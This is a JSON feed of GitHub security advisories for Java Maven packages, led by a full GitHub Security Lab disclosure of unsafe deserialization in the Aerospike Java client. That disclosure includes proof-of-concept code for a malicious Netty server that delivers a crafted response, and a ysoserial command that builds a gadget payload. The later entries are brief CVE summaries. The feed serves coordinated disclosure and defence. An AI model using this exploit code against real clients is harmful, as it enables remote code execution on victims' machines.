{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Java artifacts hosted at the Maven central repository",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Amaven",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/maven.json",
    "description": "Security Advisory for Java artifacts hosted at the Maven central repository on GitHub",
    "items": [
        {
            "content_html": "<h1 id=\"github-security-lab-ghsl-vulnerability-report-ghsl-2023-044\">GitHub Security Lab (GHSL) Vulnerability Report: <code>GHSL-2023-044</code></h1>\n<p>The <a href=\"https://securitylab.github.com\">GitHub Security Lab</a> team has identified a potential security vulnerability in <a href=\"https://github.com/aerospike/aerospike-client-java/\">Aerospike Java Client</a>.</p>\n<p>We are committed to working with you to help resolve this issue. In this report you will find everything you need to effectively coordinate a resolution of this issue with the GHSL team.</p>\n<p>If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at <code>securitylab@github.com</code> (please include <code>GHSL-2023-044</code> as a reference).</p>\n<p>If you are <em>NOT</em> the correct point of contact for this report, please let us know!</p>\n<h2 id=\"summary\">Summary</h2>\n<p>The Aerospike Java client is a Java application that implements a network protocol to communicate with an Aerospike server. Some of the messages received from the server contain Java objects that the client deserializes when it encounters them without further validation. Attackers that manage to trick clients into communicating with a malicious server can include especially crafted objects in its responses that, once deserialized by the client, force it to execute arbitrary code. This can be abused to take control of the machine the client is running on.</p>\n<h2 id=\"product\">Product</h2>\n<p>Aerospike Java Client</p>\n<h2 id=\"tested-version\">Tested Version</h2>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/releases/tag/6.1.7\">6.1.7</a></p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"issue-unsafe-deserialization-of-server-responses-ghsl-2023-044\">Issue: Unsafe deserialization of server responses (<code>GHSL-2023-044</code>)</h3>\n<p>The Aerospike Java client implements different ways of communicating with an Aerospike server to perform several operations. Asynchronous commands can be executed using the Netty framework using the <code>NettyCommand</code> class. This class includes an <code>InboundHandler</code> that extends Netty's <code>ChannelInboundHandlerAdapter</code>, which handles inbound data coming from the Netty channel established with the server. This is implemented in the <code>channelRead</code> method:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\"><code>client/src/com/aerospike/client/async/NettyCommand.java:1157</code></a></p>\n<pre><code class=\"language-java\">@Override\npublic void channelRead(ChannelHandlerContext ctx, Object msg) {\n    command.read((ByteBuf)msg);\n}\n</code></pre>\n<p>The incoming <code>msg</code> object is handled by the <code>NettyCommand.read</code> method, which behaves differently depending on the <code>state</code> variable. Several states produce paths to the vulnerable code â€” for instance, we will follow the path through <code>AsyncCommand.COMMAND_READ_HEADER</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\"><code>/client/src/com/aerospike/client/async/NettyCommand.java:489</code></a></p>\n<pre><code class=\"language-java\">private void read(ByteBuf byteBuffer) {\n    eventReceived = true;\n\n    try {\n        switch (state) {\n            // --snip--\n            case AsyncCommand.COMMAND_READ_HEADER:\n                if (command.isSingle) {\n                    readSingleHeader(byteBuffer);\n                }\n                // --snip--\n        }\n        // --snip--\n    }\n    // --snip---\n}\n</code></pre>\n<p>Some bytes are read from the message buffer and saved in <code>command.dataBuffer</code> in the <code>readSingleHeader</code> method, after which <code>parseSingleBody</code> is called:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\"><code>client/src/com/aerospike/client/async/NettyCommand.java:596</code></a></p>\n<pre><code class=\"language-java\">private void readSingleHeader(ByteBuf byteBuffer) {\n    int readableBytes = byteBuffer.readableBytes();\n    int dataSize = command.dataOffset + readableBytes;\n\n    // --snip--\n\n    byteBuffer.readBytes(command.dataBuffer, 0, dataSize);\n    command.dataOffset = dataSize;\n\n    if (command.dataOffset &gt;= receiveSize) {\n        parseSingleBody();\n    }\n}\n</code></pre>\n<p><code>parseSingleBody</code> simply delegates on <code>AsyncCommand.parseCommandResult</code>, which unless the message is compressed, directly calls <code>AsyncCommand.parseResult</code>. The implementation of this method depends on the command type. For an <code>AsyncRead</code> command, we have the following:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\"><code>client/src/com/aerospike/client/async/AsyncRead.java:68</code></a></p>\n<pre><code class=\"language-java\">@Override\nprotected final boolean parseResult() {\n    validateHeaderSize();\n\n    int resultCode = dataBuffer[dataOffset + 5] &amp; 0xFF;\n    int generation = Buffer.bytesToInt(dataBuffer, dataOffset + 6);\n    int expiration = Buffer.bytesToInt(dataBuffer, dataOffset + 10);\n    int fieldCount = Buffer.bytesToShort(dataBuffer, dataOffset + 18);\n    int opCount = Buffer.bytesToShort(dataBuffer, dataOffset + 20);\n    dataOffset += Command.MSG_REMAINING_HEADER_SIZE;\n\n    if (resultCode == 0) {\n        // --snip--\n        skipKey(fieldCount);\n        record = parseRecord(opCount, generation, expiration, isOperation);\n        return true;\n    }\n</code></pre>\n<p>It can be seen that several fields are read from the message's bytes, and then a call to <code>Command.parseRecord</code> happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\"><code>client/src/com/aerospike/client/command/Command.java:2083</code></a></p>\n<pre><code class=\"language-java\">protected final Record parseRecord(\n    int opCount,\n    int generation,\n    int expiration,\n    boolean isOperation\n)  {\n    Map&lt;String,Object&gt; bins = new LinkedHashMap&lt;&gt;();\n\n    for (int i = 0 ; i &lt; opCount; i++) {\n        int opSize = Buffer.bytesToInt(dataBuffer, dataOffset);\n        byte particleType = dataBuffer[dataOffset + 5];\n        byte nameSize = dataBuffer[dataOffset + 7];\n        String name = Buffer.utf8ToString(dataBuffer, dataOffset + 8, nameSize);\n        dataOffset += 4 + 4 + nameSize;\n\n        int particleBytesSize = opSize - (4 + nameSize);\n        Object value = Buffer.bytesToParticle(particleType, dataBuffer, dataOffset, particleBytesSize);\n</code></pre>\n<p><code>Buffer.bytesToParticle</code> converts the remaining bytes in the data buffer depending on the <code>particleType</code> field. We're interested in the <code>JBLOB</code> case:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\"><code>client/src/com/aerospike/client/command/Buffer.java:53</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToParticle(int type, byte[] buf, int offset, int len)\n    throws AerospikeException {\n        switch (type) {\n            // --snip--\n            case ParticleType.JBLOB:\n                return Buffer.bytesToObject(buf, offset, len);\n</code></pre>\n<p>In <code>bytesToObject</code>, the deserialization of an object from the message bytes happens:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L300\"><code>client/src/com/aerospike/client/command/Buffer.java:300</code></a></p>\n<pre><code class=\"language-java\">public static Object bytesToObject(byte[] buf, int offset, int length) {\n    // --snip--\n    try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) {\n        try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n            return oistream.readObject();\n        }\n    }\n    // --snip--\n}\n</code></pre>\n<p>NOTE: Take into account that there exists a similar sink, that can be reached in a similar way, in <code>Unpacker.unpackBlock</code>:</p>\n<p><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\"><code>client/src/com/aerospike/client/util/Unpacker.java:227</code></a></p>\n<pre><code class=\"language-java\">private T unpackBlob(int count) throws IOException, ClassNotFoundException {\n    // --snip--\n    case ParticleType.JBLOB:\n        // --snip--\n        try (ByteArrayInputStream bastream = new ByteArrayInputStream(buffer, offset, count)) {\n            try (ObjectInputStream oistream = new ObjectInputStream(bastream)) {\n                val = getJavaBlob(oistream.readObject());\n            }\n        }\n</code></pre>\n<p>This vulnerability was discovered with the help of <a href=\"https://codeql.github.com/\">CodeQL</a>.</p>\n<h4 id=\"impact\">Impact</h4>\n<p>This issue may lead to Remote Code Execution (RCE) in the Java client.</p>\n<h4 id=\"remediation\">Remediation</h4>\n<p>Avoid deserialization of untrusted data if at all possible. If the architecture permits it then use other formats instead of serialized objects, for example JSON or XML.  However, these formats should not be deserialized into complex objects because this provides further opportunities for attack. For example, XML-based deserialization attacks are possible through libraries such as XStream and XmlDecoder.</p>\n<p>Alternatively, a tightly controlled whitelist can limit the vulnerability of code but be aware of the existence of so-called Bypass Gadgets, which can circumvent such protection measures.</p>\n<h4 id=\"resources\">Resources</h4>\n<p>To exploit this vulnerability, a malicious Aerospike server is needed. For the sake of simplicity, we implemented a mock server with hardcoded responses, with the only goal of reaching the vulnerable code of the client. To be able to easily reproduce this, we used the client's examples with the <code>-netty</code> flag, specifically the <code>AsyncPutGet</code>, which uses an <code>AsyncRead</code>. The examples point to <code>localhost:3000</code> by default, so we set up a simple Netty TCP server listening on that port, which replicates responses previously intercepted from a real Aerospike server and returns them to the client, until the <code>AsyncRead</code> command happens. Then, our server injects the malicious response:</p>\n<pre><code class=\"language-java\">public class AttackChannelHandler extends SimpleChannelInboundHandler&lt;String&gt; {\n\n    @Override\n    protected void channelRead0(ChannelHandlerContext ctx, String s) throws Exception {\n        // --snip--\n        if (s.getBytes()[7] == 0x44) {\n            AttackMessage m = new AttackMessage(\n                    Files.readAllBytes(Paths.get(\"location/of/deserialization/payload.bin\")));\n            ctx.channel().writeAndFlush(m);\n            return;\n        }\n        // --snip--\n    }\n}\n</code></pre>\n<p><code>AttackMessage</code> is a class that hardcodes the necessary data to deliver the payload:</p>\n<pre><code class=\"language-java\">public class AttackMessage {\n\n    private byte resultCode = 0;\n    private int generation = 2;\n    private int expiration = 417523457;\n    private short fieldCount = 0;\n    private short opCount = 1;\n    private byte particleType = 7;\n    private String name = \"putgetbin\";\n    private byte[] payload;\n\n    public AttackMessage(byte[] payload) {\n        this.payload = payload;\n    }\n\n    // --snip-- (getters)\n\n    public int[] getSize() {\n        int size = 30 + name.length() + payload.length;\n        int low = (byte) (size &amp; 0xFF);\n        int high = (byte) (size &gt;&gt; 8) &amp; 0xFF;\n        return new int[] {high, low};\n    }\n\n    public int getOpSize() {\n        return payload.length + 4 + name.length();\n    }\n\n    public byte[] getPayload() {\n        return payload;\n    }\n}\n</code></pre>\n<p>And it's finally encoded and delivered to the client through the network using a <code>MessageToByteEncoder</code> from Netty:</p>\n<pre><code class=\"language-java\">public class AttackMessageEncoder extends MessageToByteEncoder&lt;AttackMessage&gt; {\n\n    @Override\n    protected void encode(ChannelHandlerContext ctx, AttackMessage msg, ByteBuf out)\n            throws Exception {\n        // header\n        out.writeBytes(new byte[] {0x02, 0x03, 0x00, 0x00, 0x00, 0x00});\n        int[] length = msg.getSize();\n        out.writeByte(length[0]);\n        out.writeByte(length[1]);\n\n        out.writeBytes(new byte[] {0x16, 0x00, 0x00, 0x00, 0x00});\n        out.writeByte(msg.getResultCode());\n        out.writeInt(msg.getGeneration());\n        out.writeInt(msg.getExpiration());\n\n        out.writeBytes(new byte[] {0x00, 0x00, 0x00, 0x00});\n        out.writeShort(msg.getFieldCount());\n        out.writeShort(msg.getOpCount());\n        out.writeInt(msg.getOpSize());\n\n        out.writeByte(0x01);\n        out.writeByte(msg.getParticleType());\n\n        out.writeByte(0x00);\n        out.writeByte(msg.getName().length());\n        out.writeCharSequence(msg.getName(), Charset.defaultCharset());\n        out.writeBytes(msg.getPayload());\n    }\n\n}\n</code></pre>\n<p>The specific deserialization payload that needs to be used depends on the deserialization gadgets available in the classpath of the application using the Aerospike client. Again, for simplicity, we assumed the victim application uses Apache Commons Collections 4.0, which contains a well-known deserialization gadget:</p>\n<pre><code class=\"language-xml\">&lt;dependency&gt;\n  &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;\n  &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;\n  &lt;version&gt;4.0&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre>\n<p>In which case, the malicious payload file could be generated using <a href=\"https://github.com/frohoff/ysoserial\"><code>ysoserial</code></a> as follows:</p>\n<pre><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections2 '/System/Applications/Calculator.app/Contents/MacOS/Calculator' &gt; payload.bin\n</code></pre>\n<h2 id=\"github-security-advisories\">GitHub Security Advisories</h2>\n<p>We recommend you create a private <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory\">GitHub Security Advisory</a> for this finding. This also allows you to invite the GHSL team to collaborate and further discuss this finding in private before it is <a href=\"https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory\">published</a>.</p>\n<h2 id=\"credit\">Credit</h2>\n<p>This issue was discovered and reported by the GitHub CodeQL team members <a href=\"https://github.com/atorralba\">@atorralba (Tony Torralba)</a> and <a href=\"https://github.com/joefarebrother\">@joefarebrother (Joseph Farebrother)</a>.</p>\n<h2 id=\"contact\">Contact</h2>\n<p>You can contact the GHSL team at <code>securitylab@github.com</code>, please include a reference to <code>GHSL-2023-044</code> in any communication regarding this issue.</p>\n<h2 id=\"disclosure-policy\">Disclosure Policy</h2>\n<p>This report is subject to our <a href=\"https://securitylab.github.com/advisories#policy\">coordinated disclosure policy</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597\">https://github.com/aerospike/aerospike-client-java/security/advisories/GHSA-jj95-55cr-9597</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900\">https://github.com/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/AsyncRead.java#L68</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L1157</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L489</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/async/NettyCommand.java#L596</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Buffer.java#L53</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/command/Command.java#L2083</a></li>\n<li><a href=\"https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227\">https://github.com/aerospike/aerospike-client-java/blob/e40a49b3db0d2b3d45068910e1cb9d917c795315/client/src/com/aerospike/client/util/Unpacker.java#L227</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jj95-55cr-9597\">https://github.com/advisories/GHSA-jj95-55cr-9597</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jj95-55cr-9597",
            "title": "[com.aerospike:aerospike-client] Aerospike Java Client vulnerable to unsafe deserialization of server responses",
            "date_modified": "2023-08-03T19:45:41.000Z",
            "date_published": "2023-08-03T19:45:39.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jj95-55cr-9597"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenNMS Meridian 2016, 2017, 2018 before 2018.1.25, 2019 before 2019.1.16, and 2020 before 2020.1.5, Horizon 1.2 through 27.0.4, and Newts &lt;1.5.3 has Incorrect Access Control, which allows local and remote code execution using JEXL expressions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3396\">https://nvd.nist.gov/vuln/detail/CVE-2021-3396</a></li>\n<li><a href=\"https://www.opennms.com/en/blog/2021-02-16-cve-2021-3396-full-security-disclosure/\">https://www.opennms.com/en/blog/2021-02-16-cve-2021-3396-full-security-disclosure/</a></li>\n<li><a href=\"https://github.com/OpenNMS/opennms/pull/3281\">https://github.com/OpenNMS/opennms/pull/3281</a></li>\n<li><a href=\"https://issues.opennms.org/browse/NMS-13103\">https://issues.opennms.org/browse/NMS-13103</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3mp-9vx3-2rvv\">https://github.com/advisories/GHSA-c3mp-9vx3-2rvv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3mp-9vx3-2rvv",
            "title": "[org.opennms:opennms-util] OpenNMS Horizon RCE via JEXL2 expression",
            "date_modified": "2023-08-03T18:43:34.000Z",
            "date_published": "2022-05-24T17:42:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3mp-9vx3-2rvv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenNMS Meridian 2016, 2017, 2018 before 2018.1.25, 2019 before 2019.1.16, and 2020 before 2020.1.5, Horizon 1.2 through 27.0.4, and Newts &lt;1.5.3 has Incorrect Access Control, which allows local and remote code execution using JEXL expressions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3396\">https://nvd.nist.gov/vuln/detail/CVE-2021-3396</a></li>\n<li><a href=\"https://www.opennms.com/en/blog/2021-02-16-cve-2021-3396-full-security-disclosure/\">https://www.opennms.com/en/blog/2021-02-16-cve-2021-3396-full-security-disclosure/</a></li>\n<li><a href=\"https://github.com/OpenNMS/opennms/pull/3281\">https://github.com/OpenNMS/opennms/pull/3281</a></li>\n<li><a href=\"https://issues.opennms.org/browse/NMS-13103\">https://issues.opennms.org/browse/NMS-13103</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3mp-9vx3-2rvv\">https://github.com/advisories/GHSA-c3mp-9vx3-2rvv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3mp-9vx3-2rvv",
            "title": "[org.opennms:opennms-provision] OpenNMS Horizon RCE via JEXL2 expression",
            "date_modified": "2023-08-03T18:43:34.000Z",
            "date_published": "2022-05-24T17:42:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3mp-9vx3-2rvv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>OpenNMS Meridian 2016, 2017, 2018 before 2018.1.25, 2019 before 2019.1.16, and 2020 before 2020.1.5, Horizon 1.2 through 27.0.4, and Newts &lt;1.5.3 has Incorrect Access Control, which allows local and remote code execution using JEXL expressions.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-3396\">https://nvd.nist.gov/vuln/detail/CVE-2021-3396</a></li>\n<li><a href=\"https://www.opennms.com/en/blog/2021-02-16-cve-2021-3396-full-security-disclosure/\">https://www.opennms.com/en/blog/2021-02-16-cve-2021-3396-full-security-disclosure/</a></li>\n<li><a href=\"https://github.com/OpenNMS/opennms/pull/3281\">https://github.com/OpenNMS/opennms/pull/3281</a></li>\n<li><a href=\"https://issues.opennms.org/browse/NMS-13103\">https://issues.opennms.org/browse/NMS-13103</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-c3mp-9vx3-2rvv\">https://github.com/advisories/GHSA-c3mp-9vx3-2rvv</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-c3mp-9vx3-2rvv",
            "title": "[org.opennms.features:org.opennms.features.measurements] OpenNMS Horizon RCE via JEXL2 expression",
            "date_modified": "2023-08-03T18:43:34.000Z",
            "date_published": "2022-05-24T17:42:35.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-c3mp-9vx3-2rvv"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>MCMS v5.2.4 was discovered to contain an arbitrary file upload vulnerability via the component <code>/ms/template/writeFileContent.do</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-23315\">https://nvd.nist.gov/vuln/detail/CVE-2022-23315</a></li>\n<li><a href=\"https://web.archive.org/web/20220125060457/https://gitee.com/mingSoft/MCMS/issues/I4Q4PX\">https://web.archive.org/web/20220125060457/https://gitee.com/mingSoft/MCMS/issues/I4Q4PX</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fr5w-98mc-jjvg\">https://github.com/advisories/GHSA-fr5w-98mc-jjvg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fr5w-98mc-jjvg",
            "title": "[net.mingsoft:ms-mcms] Arbitrary file upload in Mingsoft MCMS",
            "date_modified": "2023-08-03T17:44:01.000Z",
            "date_published": "2022-01-22T00:00:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fr5w-98mc-jjvg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Directory traversal vulnerability in the HTTP server in Mort Bay Jetty 5.1.14, 6.x before 6.1.17, and 7.x through 7.0.0.M2 allows remote attackers to access arbitrary files via directory traversal sequences in the URI.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2009-1523\">https://nvd.nist.gov/vuln/detail/CVE-2009-1523</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=499867\">https://bugzilla.redhat.com/show_bug.cgi?id=499867</a></li>\n<li><a href=\"https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01257.html\">https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01257.html</a></li>\n<li><a href=\"https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01259.html\">https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01259.html</a></li>\n<li><a href=\"https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01262.html\">https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01262.html</a></li>\n<li><a href=\"http://itrc.hp.com/service/cki/docDisplay.do?docId=emr_na-c02282388\">http://itrc.hp.com/service/cki/docDisplay.do?docId=emr_na-c02282388</a></li>\n<li><a href=\"http://jira.codehaus.org/browse/JETTY-1004\">http://jira.codehaus.org/browse/JETTY-1004</a></li>\n<li><a href=\"http://www.kb.cert.org/vuls/id/402580\">http://www.kb.cert.org/vuls/id/402580</a></li>\n<li><a href=\"http://www.kb.cert.org/vuls/id/CRDY-7RKQCY\">http://www.kb.cert.org/vuls/id/CRDY-7RKQCY</a></li>\n<li><a href=\"http://www.oracle.com/technetwork/topics/security/cpujul2009-091332.html\">http://www.oracle.com/technetwork/topics/security/cpujul2009-091332.html</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/34800\">http://www.securityfocus.com/bid/34800</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/35675\">http://www.securityfocus.com/bid/35675</a></li>\n<li><a href=\"http://www.securitytracker.com/id?1022563\">http://www.securitytracker.com/id?1022563</a></li>\n<li><a href=\"http://www.vupen.com/english/advisories/2009/1900\">http://www.vupen.com/english/advisories/2009/1900</a></li>\n<li><a href=\"http://www.vupen.com/english/advisories/2010/1792\">http://www.vupen.com/english/advisories/2010/1792</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9986-w5h5-vw59\">https://github.com/advisories/GHSA-9986-w5h5-vw59</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9986-w5h5-vw59",
            "title": "[org.mortbay.jetty:jetty] Directory traversal in Mort Bay Jetty",
            "date_modified": "2023-08-03T17:32:51.000Z",
            "date_published": "2022-05-02T03:26:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9986-w5h5-vw59"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Directory traversal vulnerability in the HTTP server in Mort Bay Jetty 5.1.14, 6.x before 6.1.17, and 7.x through 7.0.0.M2 allows remote attackers to access arbitrary files via directory traversal sequences in the URI.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2009-1523\">https://nvd.nist.gov/vuln/detail/CVE-2009-1523</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=499867\">https://bugzilla.redhat.com/show_bug.cgi?id=499867</a></li>\n<li><a href=\"https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01257.html\">https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01257.html</a></li>\n<li><a href=\"https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01259.html\">https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01259.html</a></li>\n<li><a href=\"https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01262.html\">https://www.redhat.com/archives/fedora-package-announce/2009-May/msg01262.html</a></li>\n<li><a href=\"http://itrc.hp.com/service/cki/docDisplay.do?docId=emr_na-c02282388\">http://itrc.hp.com/service/cki/docDisplay.do?docId=emr_na-c02282388</a></li>\n<li><a href=\"http://jira.codehaus.org/browse/JETTY-1004\">http://jira.codehaus.org/browse/JETTY-1004</a></li>\n<li><a href=\"http://www.kb.cert.org/vuls/id/402580\">http://www.kb.cert.org/vuls/id/402580</a></li>\n<li><a href=\"http://www.kb.cert.org/vuls/id/CRDY-7RKQCY\">http://www.kb.cert.org/vuls/id/CRDY-7RKQCY</a></li>\n<li><a href=\"http://www.oracle.com/technetwork/topics/security/cpujul2009-091332.html\">http://www.oracle.com/technetwork/topics/security/cpujul2009-091332.html</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/34800\">http://www.securityfocus.com/bid/34800</a></li>\n<li><a href=\"http://www.securityfocus.com/bid/35675\">http://www.securityfocus.com/bid/35675</a></li>\n<li><a href=\"http://www.securitytracker.com/id?1022563\">http://www.securitytracker.com/id?1022563</a></li>\n<li><a href=\"http://www.vupen.com/english/advisories/2009/1900\">http://www.vupen.com/english/advisories/2009/1900</a></li>\n<li><a href=\"http://www.vupen.com/english/advisories/2010/1792\">http://www.vupen.com/english/advisories/2010/1792</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9986-w5h5-vw59\">https://github.com/advisories/GHSA-9986-w5h5-vw59</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9986-w5h5-vw59",
            "title": "[org.mortbay.jetty:jetty] Directory traversal in Mort Bay Jetty",
            "date_modified": "2023-08-03T17:32:51.000Z",
            "date_published": "2022-05-02T03:26:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9986-w5h5-vw59"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>An incomplete cryptography of the data store function by using hidden tag in Nablarch 5 (5, and 5u1 to 5u13) allows remote attackers to obtain information of the stored data, to register invalid value, or alter the value via unspecified vectors.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-5919\">https://nvd.nist.gov/vuln/detail/CVE-2019-5919</a></li>\n<li><a href=\"https://nablarch.atlassian.net/browse/NAB-313\">https://nablarch.atlassian.net/browse/NAB-313</a></li>\n<li><a href=\"http://jvn.jp/en/jp/JVN56542712/index.html\">http://jvn.jp/en/jp/JVN56542712/index.html</a></li>\n<li><a href=\"https://github.com/nablarch/nablarch-fw-web/pull/53\">https://github.com/nablarch/nablarch-fw-web/pull/53</a></li>\n<li><a href=\"https://github.com/nablarch/nablarch-fw-web/pull/54\">https://github.com/nablarch/nablarch-fw-web/pull/54</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hmx6-gc2p-5p82\">https://github.com/advisories/GHSA-hmx6-gc2p-5p82</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hmx6-gc2p-5p82",
            "title": "[com.nablarch.framework:nablarch-fw-web] Nablarch Incomplete Cryptography",
            "date_modified": "2023-08-03T16:53:45.000Z",
            "date_published": "2022-05-13T01:08:15.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hmx6-gc2p-5p82"
            },
            "tags": [
                "severity"
